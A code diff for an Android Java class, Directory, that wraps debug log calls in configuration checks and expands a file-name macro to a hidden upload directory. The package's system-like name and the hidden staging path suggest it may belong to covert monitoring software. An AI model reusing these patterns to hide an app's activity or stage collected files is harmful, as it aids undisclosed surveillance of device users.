@@ -13,7 +13,7 @@ import java.util.Enumeration;
 
 import android.util.Log;
 
-import com.android.service.Debug;
+import com.android.service.auto.Cfg;
 import com.android.service.util.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -40,12 +40,12 @@ public class Directory {
 		final int macro = filename.indexOf(hiddenDirMacro, 0);
 		String expandedFilter = filename;
 		if (macro == 0) {
-			Log.d("QZ", TAG + " expanding macro");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " expanding macro");
 			// final String first = filter.substring(0, macro);
 			final String end = filename.substring(macro
 					+ hiddenDirMacro.length(), filename.length());
 			expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR
-			Log.d("QZ", TAG + " expandedFilter: " + expandedFilter);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " expandedFilter: " + expandedFilter);
 		}
 		return expandedFilter;
 	}
@@ -66,7 +66,7 @@ public class Directory {
 		 * "find filter shouldn't start with file:// : " + filter); //
 		 * 
 		 * if (filter.indexOf('*') >= 0) { //
-		 * Log.d("QZ", TAG + " asterisc"); //
+		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " asterisc"); //
 		 * 
 		 * // filter String baseDir = filter.substring(0,
 		 * filter.lastIndexOf('/')); final String asterisc = filter
@@ -77,7 +77,7 @@ public class Directory {
 		 * File fconn = null; try { fconn = new File("file://" + baseDir);
 		 * 
 		 * if (!fconn.isDirectory() || !fconn.canRead()) { //
-		 * Log.d("QZ", TAG + " Error: not a dir or cannot read"); //
+		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " Error: not a dir or cannot read"); //
 		 * EmptyEnumeration(); }
 		 * 
 		 * return fconn.list(asterisc, true);
@@ -85,7 +85,7 @@ public class Directory {
 		 * } catch (final IOException ex) { //
 		 * //
 		 * (IOException e) { } } } else { // single file //
-		 * Log.d("QZ", TAG + " single file"); //
+		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " single file"); //
 		 * { fconn = (FileConnection) Connector.open("file://" + filter,
 		 * Connector.READ);
 		 * 
@@ -97,7 +97,7 @@ public class Directory {
 		 * 
 		 * } catch (final IOException ex) { //
 		 * //
-		 * Log.d("QZ", TAG + " closing"); //
+		 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " closing"); //
 		 * catch (Exception e) { } } }
 		 * 
 		 * //
